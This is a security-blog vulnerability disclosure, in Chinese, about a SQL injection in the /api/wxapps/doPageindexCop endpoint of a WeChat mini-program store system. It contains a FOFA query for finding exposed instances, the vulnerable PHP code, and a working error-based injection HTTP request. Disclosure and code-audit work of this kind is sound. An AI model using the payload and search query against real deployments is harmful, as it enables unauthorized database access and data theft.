---
title: "万能门店小程序管理系统 /api/wxapps/doPageindexCop SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPageindexCop-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopageindexcop-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPageindexCop SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/18 08:16
* 544浏览
* [0评论](#comment)
* 16分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPageindexCop 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
public function doPageindexCop()
    {
        $type = input("type");
        $uniacid = input("uniacid");
        $now = time();
        $prefix = config('database.prefix');
        $indexCopAll = Db::query("SELECT * FROM {$prefix}wd_xcx_coupon WHERE uniacid = {$uniacid} and flag = 1 and (etime > {$now} or etime = 0) order by num desc,id desc");
        if ($indexCopAll) {
            $indexCopOne = $indexCopAll[0];
            if ($indexCopOne) {
                if ($indexCopOne['btime']) {
                    $indexCopOne['btime'] = date("Y-m-d", $indexCopOne['btime']);
                }
                if ($indexCopOne['etime']) {
                    $indexCopOne['etime'] = date("Y-m-d", $indexCopOne['etime']);
                }
            }
            return json_encode(array('data' => $indexCopOne));
        } else {
            return json_encode(array('data' => 1));
        }
    }
```

`$uniacid` 直接拼接进 Db::query sql语句里，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/doPageindexCop HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)--
```

[![万能门店小程序管理系统 /api/wxapps/doPageindexCop SQL 注入漏洞](images/img-001-bfc9fd6ddad6.webp)](https://image.mrxn.net/5055f4a6616540e99efb6337370fa81f.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/doPageindexCop SQL 注入漏洞](https://mrxn.net/jswz/api-wxapps-doPageindexCop-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-doPageindexCop-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPageindexCop-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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